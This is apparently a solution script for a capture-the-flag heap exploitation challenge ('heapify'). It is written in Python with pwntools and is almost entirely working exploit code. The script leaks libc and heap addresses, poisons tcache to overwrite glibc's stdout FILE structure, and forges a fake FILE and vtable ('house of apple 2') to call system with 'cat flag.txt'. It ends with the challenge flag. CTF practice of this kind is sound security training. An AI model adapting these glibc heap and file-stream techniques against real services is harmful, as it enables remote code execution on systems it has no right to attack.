from pwn import *
from sys import argv

context.log_level = 'debug'

exe = ELF('./heapify')
libc = ELF('./libc.so.6')

environ_offset = libc.symbols['environ']

unsorted_offset = 0x21ace0

conn = remote('challs.actf.co', 31501) if 'r' in argv else process('./heapify')
if 'r' not in argv:
    context.terminal = ['tmux', 'splitw', '-h', '-l', '80%']
    gdb.attach(pidof(conn)[0], '''
b *$rebase(0x150e)
ignore 1 18
b *system

''')

def alloc(sz, data):
    conn.sendlineafter(b'choice: ', b'1')
    conn.sendlineafter(b'chunk size: ', f"{sz}".encode())
    conn.sendlineafter(b'chunk data: ', data)

    conn.recvuntil(b'chunk allocated at index: ')
    idx = int(conn.recvline(keepends=False).decode())
    return idx

def delete(idx):
    conn.sendlineafter(b'choice: ', b'2')
    conn.sendlineafter(b'chunk index: ', f"{idx}".encode())

def view(idx):
    conn.sendlineafter(b'choice: ', b'3')
    conn.sendlineafter(b'chunk index: ', f"{idx}".encode())
    data = conn.recvuntil(b'\nyour', drop=True)
    return data


buffer_prev = alloc(0xe8, b'PREV')

realloc_idx = alloc(0x28, b'realloc')
# put eye on 0x100
pre_eye = alloc(0xf8, b'DDDD')
eye = alloc(0xf8, b'eye')
post_eye = alloc(0x4f8, b'post')

split_idx = alloc(0x18, b'split')

delete(realloc_idx)
realloc_idx = alloc(0x28, b'A' * 0x28 + p64(0x701))

delete(pre_eye)
pre_eye = alloc(0xf8, b'EEEE')

leak_libc = view(eye)

LIBC = u64(leak_libc.ljust(8, b'\x00')) - unsorted_offset
if LIBC < 0:
    print(f"LIBC not correctly get")
    conn.close()
    exit(1)

on_eye = alloc(0x48, b'oneye')
delete(on_eye)

# eye ends with 4d0 (eye chunk 4c0)
leak_heap = view(eye)
EYE_ADDR = ((u64(leak_heap.ljust(8, b'\x00'))) * (2**12) + 0x4d0)

print(f"LIBC: {LIBC:x}, EYE_ADDR: {EYE_ADDR:x} (offset={0x290 + 0xf0 + 0x1010 + 0x30 + 0x100 + 0x10:x}), last_idx={on_eye}")

# tcache poisoning?
on_eye = alloc(0x48, b'FIRST')
eye_after = alloc(0x48, b'SECOND')

delete(eye_after)
delete(on_eye)


# house of apple 2

# construct fake file
fake_widedata_addr = EYE_ADDR + 0x50 * 2

# fake file is 0xe0 long
fake_file = bytearray(0xe0)

cmd = b';cat flag.txt;'
# fake_file[0:8] = b'  sh;'.ljust(8, b'\x00')
# this flag is rdi, but it also should bypass certain check
fake_file[0:8] = p64(2**64 + ~(2|8|0x800))
fake_file[8:8 + len(cmd)] = cmd

fake_file[0xa0:0xa8] = p64(fake_widedata_addr)
fake_file[0xd8:0xe0] = p64(LIBC + libc.symbols['_IO_wfile_jumps'])
fake_file = bytes(fake_file)

# fake vtable, 
fake_vtable = bytearray(0x200)
fake_vtable[0x18:0x20] = p64(0)
fake_vtable[0x30:0x38] = p64(0)
fake_vtable[0xe0:0xe8] = p64(fake_widedata_addr + 0x100)

fake_vtable[0x168:0x170] = p64(LIBC + libc.functions['system'].address)
fake_vtable = bytes(fake_vtable)

fake_iofile_idx = alloc(0x208, fake_vtable)

# find io_str_jumps
io_file_jump_offset = libc.symbols['_IO_file_jumps']
io_str_underflow_offset = libc.symbols['_IO_str_underflow']
for ref_offset in libc.search(p64(io_str_underflow_offset)):
    possible_strjmp_offset = ref_offset - 0x20
    if possible_strjmp_offset > io_file_jump_offset:
        io_str_jump_offset = possible_strjmp_offset
        break

print(f"_IO_str_jumps: {io_str_jump_offset:x}")

delete(pre_eye)
pre_eye = alloc(0xf8, b'H' * 0xf8 + p64(0x51) + p64((LIBC + libc.symbols['_IO_2_1_stdout_']) ^ ((EYE_ADDR) >> 12)) + b'A' * 0x40 + p32(0x51))

on_eye = alloc(0x48, b'afterpoison')
target = alloc(0x48, fake_file[:-1])

# leak_environ = u64(view(target).ljust(8, b'\x00'))
# print(f"environ： {leak_environ:x}")
# house of apple?


conn.interactive()

# actf{wh3re_did_my_pr3c1ous_fr33_hook_go??}